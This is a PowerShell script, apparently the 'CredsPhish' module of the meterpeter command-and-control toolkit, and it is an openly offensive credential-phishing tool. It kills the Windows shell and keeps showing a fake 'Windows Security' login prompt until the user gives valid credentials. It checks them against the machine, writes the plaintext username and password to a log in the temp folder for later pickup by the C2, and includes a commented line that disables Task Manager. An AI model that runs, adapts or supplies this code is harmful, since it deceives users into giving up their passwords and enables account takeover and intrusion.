<#
.SYNOPSIS
  Standalone Powershell script that will promp the current user for a valid credential.

.Author: enigma0x3 &('r00t-3xp10it')
  Required Dependencies: None
  Optional Dependencies: None

.DESCRIPTION
   CredsPhish allows an attacker to craft a credentials prompt using Windows PromptForCredential,
   validate it against the DC or localmachine and in turn leak it via an remote logfile stored on
   target %TMP% folder to be retrieved later by 'ReadLog' meterpeter module. meterpeter C2 will
   create '$env:tmp\CredsPhish.vbs' to be abble to silent execute this PS script. This module
   as inspired in the work of @enigma0x3 from GitHub (https://github.com/enigma0x3)

.EXECUTION
   powershell.exe -exec bypass -w 1 -noninteractive -nologo -file "CredsPhish.ps1"
 
.LINK
    https://github.com/r00t-3xp10it/meterpeter
    http://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask
    https://raw.githubusercontent.com/enigma0x3/Invoke-LoginPrompt/master/Invoke-LoginPrompt.ps1
#>


$account = $null
$timestamp = $null
Stop-Process -Name "explorer" -Force


[int]$counter = 1
while ($counter -lt '1000000000')
{
  $user    = [Environment]::UserName
  $domain  = [Environment]::UserDomainName

  Add-Type -assemblyname System.Windows.Forms
  Add-Type -assemblyname System.DirectoryServices.AccountManagement
  $DC = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
	
  $account=[System.Security.Principal.WindowsIdentity]::GetCurrent().name
  $credential = $host.ui.PromptForCredential("Windows Security", "Please enter your UserName and Password.", $Account, "NetBiosUserName")
  $validate = $DC.ValidateCredentials($account, $credential.GetNetworkCredential().password)

    $user = $credential.GetNetworkCredential().username;
    $pass = $credential.GetNetworkCredential().password;
    If(-not($validate) -or $validate -eq $null)
    {
      $logpath = Test-Path -Path "$env:tmp\CredsPhish.log";If($logpath -eq $True){Remove-Item $env:tmp\CredsPhish.log -Force}
      $msgbox = [System.Windows.Forms.MessageBox]::Show("Invalid Credentials, Please try again ..", "$Account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
    }else{
      $timestamp = Get-Date;
      $msgbox = [System.Windows.Forms.MessageBox]::Show("Authentication Successful, UnLocking WorkStation ..", "$Account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
      echo "" > $env:tmp\CredsPhish.log
      echo "   Captured Credentials (logon)" >> $env:tmp\CredsPhish.log
      echo "   ----------------------------" >> $env:tmp\CredsPhish.log
      echo "   TimeStamp : $timestamp" >> $env:tmp\CredsPhish.log
      echo "   username  : $user" >> $env:tmp\CredsPhish.log
      echo "   password  : $pass" >> $env:tmp\CredsPhish.log
      # cmd /c REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableTaskMgr /t REG_DWORD /d 1 /f
      Start-Process -FilePath $env:windir\explorer.exe
      exit
    }
  $counter++
}
